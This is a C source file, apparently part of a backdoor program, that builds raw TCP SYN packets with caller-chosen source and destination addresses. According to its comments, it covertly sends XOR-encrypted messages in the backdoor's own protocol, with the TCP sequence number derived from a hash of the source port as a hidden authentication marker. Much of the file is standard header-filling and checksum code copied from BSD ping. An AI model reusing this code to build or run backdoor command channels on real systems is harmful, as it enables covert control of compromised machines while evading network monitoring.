#include "networking.h"

#include "constants.h"
#include "packet_auth.h"

#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

/*
 * Sends the the given message to the given address. The message is sent
 * according to the protocol used by the backdoor. The msg is encrypted using
 * XOR and the TCP sequence number is the first 4B of the SHA256 hash of the
 * source port.
 *
 * Params:
 *      const struct in_addr src: The source address to use.
 *
 *      const struct in_addr dst: The destination address to use.
 *
 *      const unsigned short port: The value to be used for the TCP source port.
 * The TCP sequence number will be derived from this.
 *
 *      const char *msg: The message to encrypt and send. const int msg_len: The
 * length of the message to send.
 */
void send_message_to_ip(const struct in_addr src, const struct in_addr dst,
                        const unsigned short port, char *msg, int msg_len) {
    const int SEND_FLAGS = 0;
    int sock;
    int hdr_len;
    int packet_len;
    struct sockaddr_in sin;
    struct ip_tcp_hdr send_tcp;
    char *packet;

    // seed random number generator
    srand(time(0));

    // open raw socket
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        return;

    // create ip header
    fill_iphdr(&send_tcp.ip, src, dst);

    // create tcp header
    fill_tcphdr(&send_tcp.tcp, rand() & 0xFFFF, port);
    fill_tcp_checksum(&send_tcp);
    hdr_len = (send_tcp.ip.ihl * 4) + (send_tcp.tcp.doff * 4);
    send_tcp.ip.tot_len = htons(hdr_len);

    // create sockaddr
    sin.sin_family = AF_INET;
    sin.sin_port = send_tcp.tcp.source;
    sin.sin_addr.s_addr = send_tcp.ip.daddr;

    // create the entire packet
    packet_len = hdr_len + msg_len;
    if ((packet = (char *)malloc(packet_len))) {
        // copy header and payload int packet
        memcpy(packet, (char *)&send_tcp, hdr_len);
        memcpy(packet + hdr_len, msg, msg_len);

        // write packet packet
        sendto(sock, packet, packet_len, SEND_FLAGS, (struct sockaddr *)&sin, sizeof(sin));

        // clean up
        free(packet);
    }

    // more clean up
    close(sock);
}

/*
 * Fills the IPv4 header structure. Things of note:
 *      - The size is the default size with no no options. (20B)
 *      - The ID is random.
 *
 * Params:
 *      struct iphdr* hdr: The IPv4 header structure to fill.
 *
 *      const struct in_addr src; The source address to use.
 *
 *      const struct in_addr dst; The destination address to use.
 */
void fill_iphdr(struct iphdr *hdr, const struct in_addr src, const struct in_addr dst) {
    hdr->ihl = 5;
    hdr->version = 4;
    hdr->tos = 0;
    hdr->id = (int)(255.0 * rand() / (RAND_MAX + 1.0));
    hdr->frag_off = 0;
    hdr->ttl = 64;
    hdr->protocol = IPPROTO_TCP;
    hdr->check = 0;
    hdr->saddr = src.s_addr;
    hdr->daddr = dst.s_addr;
    hdr->check = in_cksum((unsigned short *)hdr, hdr->ihl * 5);
}

/*
 * Fills the TCP header structure. Things of note:
 *      - The size is the default size with no options. (20B)
 *      - The sequence number is derived from the source port number.
 *      - The packet is set as a SYN packet.
 *
 * Params:
 *      struct tcphdr* hdr: The TCP header structure to fill.
 *
 *      const short src_port: The source port to use.
 *
 *      const shrot dst_port: The destination port to use.
 */
void fill_tcphdr(struct tcphdr *hdr, const short src_port, const short dst_port) {
    hdr->source = htons(src_port);
    hdr->dest = htons(dst_port);
    hdr->seq = htonl(gen_auth_seq_num(src_port));

    hdr->ack_seq = 0;
    hdr->doff = 5;
    hdr->fin = 0;
    hdr->syn = 1;
    hdr->rst = 0;
    hdr->psh = 0;
    hdr->ack = 0;
    hdr->urg = 0;
    hdr->ece = 0;
    hdr->cwr = 0;
    hdr->res1 = 0;
    hdr->window = htons(512);
    hdr->check = 0;
    hdr->urg_ptr = 0;
}

/**
 * Caclulates and populates the TCP checksum field.
 *
 * Params:
 *      struct ip_tcp_hdr* hdr: The IPv4 and TCP header to checksum.
 */
void fill_tcp_checksum(struct ip_tcp_hdr *hdr) {
    struct pseudo_header pHeader;

    pHeader.source_address = hdr->ip.saddr;
    pHeader.dest_address = hdr->ip.daddr;
    pHeader.placeholder = 0;
    pHeader.protocol = IPPROTO_TCP;
    short tmp = htons(hdr->tcp.doff * 4);
    pHeader.tcp_length = tmp;
    memcpy((char *)&pHeader.tcp, (char *)&hdr->tcp, hdr->tcp.doff * 4);

    hdr->tcp.check = in_cksum((unsigned short *)&pHeader, sizeof(struct pseudo_header));
}

/* clipped from ping.c (this function is the whore of checksum routines */
/* as everyone seems to use it..I feel so dirty...) */

/* Copyright (c)1987 Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms are permitted
 * provided that the above copyright notice and this paragraph are
 * dupliated in all such forms and that any documentation, advertising
 * materials, and other materials related to such distribution and use
 * acknowledge that the software was developed by the University of
 * California, Berkeley. The name of the University may not be used
 * to endorse or promote products derived from this software without
 * specific prior written permission. THIS SOFTWARE IS PROVIDED ``AS
 * IS'' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
 * WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHATIBILITY AND
 * FITNESS FOR A PARTICULAR PURPOSE
 */
unsigned short in_cksum(unsigned short *ptr, int nbytes) {
    register long sum; /* assumes long == 32 bits */
    u_short oddbyte;
    register u_short answer; /* assumes u_short == 16 bits */

    /*
     * Our algorithm is simple, using a 32-bit accumulator (sum),
     * we add sequential 16-bit words to it, and at the end, fold back
     * all the carry bits from the top 16 bits into the lower 16 bits.
     */

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nbytes == 1) {
        oddbyte = 0;                            /* make sure top half is zero */
        *((u_char *)&oddbyte) = *(u_char *)ptr; /* one byte only */
        sum += oddbyte;
    }

    /*
     * Add back carry outs from top 16 bits to low 16 bits.
     */

    sum = (sum >> 16) + (sum & 0xffff); /* add high-16 to low-16 */
    sum += (sum >> 16);                 /* add carry */
    answer = ~sum;                      /* ones-complement, then truncate to 16 bits */
    return (answer);
} /* end in_cksm() */